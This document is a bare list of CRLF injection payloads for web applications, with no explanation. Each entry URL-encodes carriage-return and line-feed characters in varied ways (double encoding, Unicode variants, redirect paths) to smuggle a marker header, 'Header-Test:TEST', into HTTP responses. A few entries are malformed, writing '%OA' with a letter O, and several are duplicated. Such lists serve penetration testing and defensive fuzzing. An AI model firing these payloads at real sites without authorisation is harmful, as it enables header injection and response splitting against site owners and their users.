# CRLF Injection Payloads

`%0AHeader-Test:TEST`

`%0A%20Header-Test:TEST`

`%20%0AHeader-Test:TEST`

`%23%OAHeader-Test:TEST`
    
`%E5%98%8A%E5%98%8DHeader-Test:TEST`

`%E5%98%8A%E5%98%8D%0AHeader-Test:TEST`

`%3F%0AHeader-Test:TEST`

`crlf%0AHeader-Test:TEST`

`crlf%0A%20Header-Test:TEST`

`crlf%20%0AHeader-Test:TEST`

`crlf%23%OAHeader-Test:TEST`

`crlf%E5%98%8A%E5%98%8DHeader-Test:TEST`

`crlf%E5%98%8A%E5%98%8D%0AHeader-Test:TEST`

`crlf%3F%0AHeader-Test:TEST`

`%0DHeader-Test:TEST`

`%0D%20Header-Test:TEST`

`%20%0DHeader-Test:TEST`

`%23%0DHeader-Test:TEST`

`%23%0AHeader-Test:TEST`

`%E5%98%8A%E5%98%8DHeader-Test:TEST`

`%E5%98%8A%E5%98%8D%0DHeader-Test:TEST`

`%3F%0DHeader-Test:TEST`

`crlf%0DHeader-Test:TEST`

`crlf%0D%20Header-Test:TEST`

`crlf%20%0DHeader-Test:TEST`

`crlf%23%0DHeader-Test:TEST`

`crlf%23%0AHeader-Test:TEST`

`crlf%E5%98%8A%E5%98%8DHeader-Test:TEST`

`crlf%E5%98%8A%E5%98%8D%0DHeader-Test:TEST`

`crlf%3F%0DHeader-Test:TEST`

`%0D%0AHeader-Test:TEST`

`%0D%0A%20Header-Test:TEST`

`%20%0D%0AHeader-Test:TEST`

`%23%0D%0AHeader-Test:TEST`

`\r\nHeader-Test:TEST`

`\r\n Header-Test:TEST`

`\r\n Header-Test:TEST`

`%5cr%5cnHeader-Test:TEST`

`%E5%98%8A%E5%98%8DHeader-Test:TEST`

`%E5%98%8A%E5%98%8D%0D%0AHeader-Test:TEST`

`%3F%0D%0AHeader-Test:TEST`

`crlf%0D%0AHeader-Test:TEST`

`crlf%0D%0A%20Header-Test:TEST`

`crlf%20%0D%0AHeader-Test:TEST`

`crlf%23%0D%0AHeader-Test:TEST`

`crlf\r\nHeader-Test:TEST`

`crlf%5cr%5cnHeader-Test:TEST`

`crlf%E5%98%8A%E5%98%8DHeader-Test:TEST`

`crlf%E5%98%8A%E5%98%8D%0D%0AHeader-Test:TEST`

`crlf%3F%0D%0AHeader-Test:TEST`

`%0D%0A%09Header-Test:TEST`

`crlf%0D%0A%09Header-Test:TEST`

`%250AHeader-Test:TEST`

`%25250AHeader-Test:TEST`

`%%0A0AHeader-Test:TEST`

`%25%30AHeader-Test:TEST`

`%25%30%61Header-Test:TEST`

`%u000AHeader-Test:TEST`
    
`//www.google.com/%2F%2E%2E%0D%0AHeader-Test:TEST`
    
`/www.google.com/%2E%2E%2F%0D%0AHeader-Test:TEST`

`/google.com/%2F..%0D%0AHeader-Test:TEST`
